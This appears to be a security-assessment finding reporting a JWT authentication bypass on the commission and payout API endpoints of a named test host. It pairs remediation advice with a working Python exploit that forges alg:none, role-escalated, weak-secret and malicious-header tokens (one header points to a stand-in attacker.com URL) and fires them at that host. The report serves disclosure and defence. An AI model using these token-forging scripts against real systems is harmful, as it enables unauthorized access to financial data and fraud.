# Critical JWT Authentication Bypass Enabling Unauthorized Access to Financial Data

**ID:** vuln-0013
**Severity:** CRITICAL
**Found:** 2026-02-26 14:30:02 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/commissions, /api/payouts
**Method:** GET, POST, PUT, DELETE
**CVE:** CVE-2024-25624
**CWE:** CWE-287
**CVSS:** 9.9

## Description

A critical JWT authentication bypass vulnerability was discovered in the Commissions application that allows complete bypass of authentication and authorization controls on sensitive financial endpoints. The application fails to properly validate JWT tokens on specific endpoints, enabling attackers to manipulate token claims, signatures, and headers to gain unauthorized access to sensitive financial data.

The vulnerability affects the `/api/commissions` and `/api/payouts` endpoints, which contain sensitive financial information about commissions and payouts. Attackers can create arbitrary tokens with any role, including admin privileges, and access these endpoints without proper authorization.

## Impact

Successful exploitation of this vulnerability allows attackers to:

1. **Complete Authentication Bypass**: Access sensitive endpoints without valid authentication
2. **Privilege Escalation**: Escalate privileges from any authenticated user to admin or super admin
3. **Unauthorized Data Access**: Access sensitive financial data including commissions and payouts for all users
4. **Financial Fraud**: Potentially manipulate commission calculations or payout amounts
5. **Long-term Persistence**: Create long-lived tokens that persist even after password changes
6. **Token Forgery**: Create tokens with any signature, including unsigned tokens (alg: none)

**Business Impact:**
- Exposure of sensitive financial data for all users
- Potential for financial fraud and manipulation of payouts
- Complete compromise of financial system integrity
- Regulatory compliance violations
- Loss of customer trust and reputational damage
- Financial and legal consequences from data breaches

## Technical Analysis

**Root Cause Analysis:**

The vulnerability stems from a complete failure of JWT token validation on specific endpoints. The application:

1. **Does not validate token signatures**: Accepts tokens with invalid, empty, or no signatures
2. **Does not enforce role validation**: Trusts role claims from JWT tokens without server-side validation
3. **Does not enforce token expiration**: Accepts expired tokens and tokens with extended expiration
4. **Does not validate token headers**: Accepts malicious header parameters including path traversal attempts
5. **Endpoint-specific protection**: Only certain endpoints (/api/admin/*) are properly protected

**Technical Details:**

1. **Vulnerable Endpoints**: `/api/commissions` and `/api/payouts`
2. **Protected Endpoints**: `/api/account`, `/api/admin/users`, `/api/admin/roles`
3. **Token Validation Failures**:
   - Accepts unsigned tokens (alg: none)
   - Accepts tokens with empty signatures
   - Accepts tokens signed with weak secrets ("secret")
   - Accepts tokens with malicious header parameters
   - Accepts tokens with modified role claims
   - Accepts expired tokens and tokens with extended expiration

4. **Attack Vectors**:
   - **Signature Bypass**: Tokens with any signature (or no signature) are accepted
   - **Role Manipulation**: Role claims can be modified to escalate privileges
   - **Header Injection**: Malicious header parameters are accepted
   - **Token Type Confusion**: ID tokens are accepted where access tokens are expected

**Vulnerability Pattern:**
The application appears to have different authentication middleware for different endpoints. The middleware protecting `/api/commissions` and `/api/payouts` completely trusts the JWT token claims without validation, while the middleware protecting `/api/admin/*` endpoints properly validates tokens.

## Proof of Concept

**Proof of Concept - Step by Step:**

1. **Obtain a valid JWT token** (as any authenticated user):
   - Authenticate normally to get a valid token
   - Example: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiY2xpZW50Iiwicm9sZSI6IlJPTEVfQ0xJRU5UIn0.xxx`

2. **Create a malicious token** (multiple techniques work):
   - **Technique 1: Unsigned token (alg: none)**
     ```python
     import jwt
     import json
     payload = {
         "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_ADMIN",
         "access": '["ROLE_ADMIN"]',
         "exp": 1803644511  # 1 year expiration
     }
     unsigned_token = f"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{jwt.utils.base64url_encode(json.dumps(payload).encode()).decode().rstrip('=')}."
     ```

   - **Technique 2: Token with malicious role claims**
     ```python
     malicious_payload = {
         "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_SUPER_ADMIN",
         "access": '["ROLE_SUPER_ADMIN", "ROLE_SYSTEM"]',
         "exp": 1803644511
     }
     malicious_token = jwt.encode(malicious_payload, "fake_secret", algorithm="HS256")
     ```

   - **Technique 3: Token with malicious headers**
     ```python
     malicious_headers = {
         "kid": "../../../../dev/null",
         "x5u": "https://attacker.com/malicious.cert"
     }
     malicious_token = jwt.encode(payload, "fake_secret", algorithm="HS256", headers=malicious_headers)
     ```

3. **Use the malicious token to access sensitive endpoints**:
   ```bash
   curl -H "Authorization: Bearer $malicious_token" \
        https://commissionstest.callippus.in/api/commissions
   ```

4. **Observe successful access to sensitive data**:
   - The request returns HTTP 200 with sensitive commission data
   - The attacker now has unauthorized access to financial information
   - The same token works on `/api/payouts` endpoint
   - The token is rejected on `/api/admin/users` endpoint (properly protected)

**Impact Demonstration:**
- Attackers can access all commission and payout data
- Attackers can escalate privileges to admin level
- Attackers can create long-lived tokens for persistence
- Attackers can bypass all authentication requirements

```
#!/usr/bin/env python3
"""
JWT Authentication Bypass Exploit Proof of Concept
Demonstrates complete authentication bypass via JWT manipulation
"""

import jwt
import requests
import json
from datetime import datetime, timedelta

# Target configuration
TARGET_URL = "https://commissionstest.callippus.in"
VULNERABLE_ENDPOINTS = ["/api/commissions", "/api/payouts"]
PROTECTED_ENDPOINTS = ["/api/admin/users", "/api/account"]

def create_malicious_tokens():
    """Create various malicious JWT tokens that bypass authentication"""
    base_payload = {
        "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name": "attacker",
        "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "ROLE_SUPER_ADMIN",
        "access": '["ROLE_SUPER_ADMIN", "ROLE_SYSTEM"]',
        "exp": int((datetime.now() + timedelta(days=365)).timestamp()),
        "iss": "http://callippus.co.uk",
        "aud": "http://callippus.co.uk"
    }

    # 1. Unsigned token (alg: none) - most severe
    unsigned_payload = base_payload.copy()
    unsigned_token = f"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.{jwt.utils.base64url_encode(json.dumps(unsigned_payload).encode()).decode().rstrip('=')}."

    # 2. Token with malicious role claims
    role_token = jwt.encode(base_payload, "fake_secret", algorithm="HS256")

    # 3. Token with malicious headers
    header_token = jwt.encode(base_payload, "fake_secret", algorithm="HS256", headers={
        "kid": "../../../../dev/null",
        "x5u": "https://attacker.com/malicious.cert"
    })

    # 4. Token with weak secret
    weak_token = jwt.encode(base_payload, "secret", algorithm="HS256")

    return {
        "unsigned_token": unsigned_token,
        "role_token": role_token,
        "header_token": header_token,
        "weak_token": weak_token
    }

def test_authentication_bypass(tokens):
    """Test authentication bypass with malicious tokens"""
    results = {}

    for token_name, token in tokens.items():
        print(f"\n[*] Testing {token_name}: {token[:50]}...")
        headers = {"Authorization": f"Bearer {token}"}

        # Test vulnerable endpoints
        print("[*] Vulnerable endpoints (should succeed):")
        for endpoint in VULNERABLE_ENDPOINTS:
            try:
                response = requests.get(f"{TARGET_URL}{endpoint}", headers=headers, timeout=10)
                success = 200 <= response.status_code < 300
                print(f"  - {endpoint}: {response.status_code} (Success: {success})")
                if endpoint not in results:
                    results[endpoint] = {}
                results[endpoint][token_name] = {
                    "status": response.status_code,
                    "success": success,
                    "length": len(response.text)
                }
            except Exception as e:
                print(f"  - {endpoint}: Error - {str(e)}")

        # Test protected endpoints
        print("[*] Protected endpoints (should fail):")
        for endpoint in PROTECTED_ENDPOINTS:
            try:
                response = requests.get(f"{TARGET_URL}{endpoint}", headers=headers, timeout=10)
                success = 200 <= response.status_code < 300
                print(f"  - {endpoint}: {response.status_code} (Success: {success})")
                if endpoint not in results:
                    results[endpoint] = {}
                results[endpoint][token_name] = {
                    "status": response.status_code,
                    "success": success,
                    "length": len(response.text)
                }
            except Exception as e:
                print(f"  - {endpoint}: Error - {str(e)}")

    return results

def main():
    print("[*] JWT Authentication Bypass Exploit Proof of Concept")
    print("[*] Target: {}".format(TARGET_URL))
    print("[*] Creating malicious JWT tokens...")

    # Create malicious tokens
    tokens = create_malicious_tokens()

    # Test authentication bypass
    print("\n[*] Testing authentication bypass...")
    results = test_authentication_bypass(tokens)

    # Analyze results
    print("\n[*] Results Analysis:")
    vulnerable_success = sum(1 for endpoint in VULNERABLE_ENDPOINTS
                           for token in tokens
                           if results.get(endpoint, {}).get(token, {}).get("success", False))

    protected_success = sum(1 for endpoint in PROTECTED_ENDPOINTS
                          for token in tokens
                          if results.get(endpoint, {}).get(token, {}).get("success", False))

    print(f"  - Vulnerable endpoints accessible: {vulnerable_success}/{len(VULNERABLE_ENDPOINTS) * len(tokens)}")
    print(f"  - Protected endpoints accessible: {protected_success}/{len(PROTECTED_ENDPOINTS) * len(tokens)}")

    if vulnerable_success > 0:
        print("\n[!] CRITICAL VULNERABILITY CONFIRMED!")
        print("    The application accepts manipulated JWT tokens on sensitive endpoints.")
        print("    Attackers can bypass authentication and access financial data.")
        print("    This represents a complete compromise of financial system security.")
    else:
        print("\n[-] Vulnerability not confirmed.")

    return results

if __name__ == "__main__":
    main()
```

## Remediation

**Immediate Remediation Steps:**

1. **Implement Proper JWT Signature Validation:**
   - Validate token signatures using the correct secret key
   - Reject tokens with invalid, empty, or missing signatures
   - Implement algorithm pinning to prevent algorithm confusion attacks
   - Never accept unsigned tokens (alg: none)

2. **Enforce Consistent Authentication Middleware:**
   - Apply the same authentication middleware to all endpoints
   - Ensure all sensitive endpoints are properly protected
   - Remove endpoint-specific authentication logic that trusts token claims

3. **Implement Server-Side Role Validation:**
   - Do not trust role claims from JWT tokens
   - Validate user roles against a server-side database on each request
   - Implement proper authorization checks for all sensitive operations

4. **Enforce Token Expiration:**
   - Strictly enforce token expiration (exp claim)
   - Reject expired tokens immediately
   - Implement short-lived tokens (e.g., 15-30 minutes)
   - Implement refresh token rotation for long-lived sessions

5. **Implement Token Revocation:**
   - Create a token revocation mechanism for logged-out or compromised tokens
   - Maintain a list of revoked tokens and check against it on each request
   - Implement token blacklisting for compromised accounts

6. **Secure Token Headers:**
   - Validate all token header parameters
   - Reject tokens with malicious header values
   - Implement proper key management for JWK and x5u headers

**Implementation Example (Pseudocode):**

```csharp
// Secure JWT validation middleware
public async Task ValidateJwtToken(string token)
{
    try
    {
        // 1. Parse and validate token structure
        var handler = new JwtSecurityTokenHandler();
        if (!handler.CanReadToken(token))
            throw new SecurityTokenException("Invalid token format");

        // 2. Validate token signature and claims
        var principal = handler.ValidateToken(token,
            new TokenValidationParameters
            {
                // Signature validation
                ValidateIssuerSigningKey = true,
                IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(_config["Jwt:Key"])),

                // Algorithm validation
                ValidAlgorithms = new[] { "HS256" }, // Only allow specific algorithm
                RequireSignedTokens = true, // Never accept unsigned tokens

                // Claim validation
                ValidateIssuer = true,
                ValidIssuer = _config["Jwt:Issuer"],
                ValidateAudience = true,
                ValidAudience = _config["Jwt:Audience"],
                ValidateLifetime = true, // Enforce expiration
                ClockSkew = TimeSpan.Zero, // No tolerance for expired tokens

                // Additional security
                RequireExpirationTime = true,
                ValidateTokenReplay = true // Check for token replay
            }, out SecurityToken validatedToken);

        // 3. Get user ID from token
        var userId = principal.FindFirst(ClaimTypes.NameIdentifier)?.Value;
        if (string.IsNullOrEmpty(userId))
            throw new SecurityTokenException("Invalid user identifier");

        // 4. Look up user roles from database (don't trust token claims)
        var userRoles = await _userRepository.GetUserRolesAsync(userId);
        if (userRoles == null || !userRoles.Any())
            throw new SecurityTokenException("User has no roles");

        // 5. Set roles in context for authorization
        context.User = new ClaimsPrincipal(new ClaimsIdentity(
            principal.Claims.Concat(userRoles.Select(r => new Claim(ClaimTypes.Role, r)))
        ));

        // 6. Check token revocation list
        if (await _tokenRevocationService.IsTokenRevoked(token))
            throw new SecurityTokenException("Token has been revoked");
    }
    catch (Exception ex)
    {
        // Log security events
        _logger.LogWarning(ex, "JWT validation failed");

        // Reject invalid tokens
        context.Response.StatusCode = 401;
        await context.Response.WriteAsync("Unauthorized");
    }
}
```

**Additional Recommendations:**

1. **Security Audit:**
   - Conduct a comprehensive security audit of all authentication and authorization code
   - Review all endpoints for consistent protection
   - Identify and fix any other endpoint-specific authentication logic

2. **Monitoring and Logging:**
   - Implement detailed logging of authentication attempts
   - Monitor for unusual token usage patterns
   - Alert on multiple failed authentication attempts
   - Log token validation failures for security analysis

3. **Security Testing:**
   - Implement automated security testing in the CI/CD pipeline
   - Include JWT security tests in your test suite
   - Regularly test for authentication bypass vulnerabilities

4. **Developer Training:**
   - Train developers on secure coding practices for JWT implementation
   - Educate developers on common JWT vulnerabilities and attacks
   - Provide secure coding guidelines for authentication and authorization

5. **Incident Response:**
   - Develop an incident response plan for authentication bypass vulnerabilities
   - Prepare for potential data breach scenarios
   - Establish procedures for token revocation and system recovery

**Long-term Security Improvements:**
- Consider migrating to more secure authentication mechanisms
- Implement hardware security modules (HSMs) for key management
- Use short-lived tokens with frequent rotation
- Implement additional security layers (IP restrictions, device fingerprinting)
- Regularly rotate JWT signing keys

